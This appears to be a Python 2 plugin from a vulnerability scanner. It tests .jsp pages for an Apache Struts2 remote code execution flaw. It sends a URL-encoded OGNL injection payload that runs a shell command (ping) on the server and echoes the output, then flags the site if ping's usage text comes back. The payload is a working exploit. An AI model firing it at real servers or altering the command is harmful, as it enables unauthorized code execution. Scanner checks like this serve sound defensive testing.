#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from urlparse import urlparse
'''
Apache Struts2 Skill名称远程代码执行漏洞
'''

def run_url(http, ob, item):
    result = []
    header = {
        "Host": ob['domain'],
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Referer": item['refer'],
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": ob.get('cookie')
    }
    try:
        path = item['url']
        method = item['method']
        result = []
        if not re.search(r'(\.jsp)', path, re.I):
            pass
        else:
            url_parse = urlparse(path)
            netloc = url_parse.netloc
            source_ip = ob.get('source_ip')
            if source_ip:
                netloc = source_ip
            cmd = "a%3d1%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40" \
                   "java.lang.Runtime%40getRuntime().exec(%27ping%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+" \
                   "java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b50000%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40" \
                   "org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d"

            new_url = '%s://%s%s?%s' % (url_parse.scheme, netloc, url_parse.path, cmd)
            res, content = http.request(new_url, method.upper(), headers=header)
            if res.get('status') == '200':
                if re.search(r'ping.*\[-(c|n) count\].*\[-i', content, re.M|re.I):
                    response = getResponse(res, content)
                    request = getRequest(new_url, headers=header, domain=ob['domain'])
                    detail = " Apache Struts2 Skill名远程代码执行漏洞"
                    result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
    except Exception, e:
        logger.error("StrutkillScript_yd.py, run_url function :%s" % (str(e)))
    return result
